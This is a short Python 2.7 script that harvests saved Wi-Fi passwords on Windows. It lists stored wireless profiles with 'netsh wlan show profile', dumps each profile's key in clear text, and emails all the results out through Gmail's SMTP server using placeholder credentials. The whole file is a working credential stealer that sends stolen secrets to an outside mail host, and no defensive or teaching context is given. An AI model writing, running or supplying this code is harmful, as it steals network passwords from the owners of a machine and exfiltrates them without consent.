#!/usr/bin/en python
#Seems to only work for python 2.7 for now...
import subprocess, smtplib, re


def send_mail(email, password, message):
    # Create an instace of an SMTP server, google allows you to use theirs
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    # Params (From, To, Message)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
# print(network_names.group(1))


result = ""


for network_name in network_names_list:
    print(network_name)
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result


# Need to enable Less secure app access for gmail to work with this
# https://myaccount.google.com/lesssecureapps?pli=1
send_mail("email", "password", result)
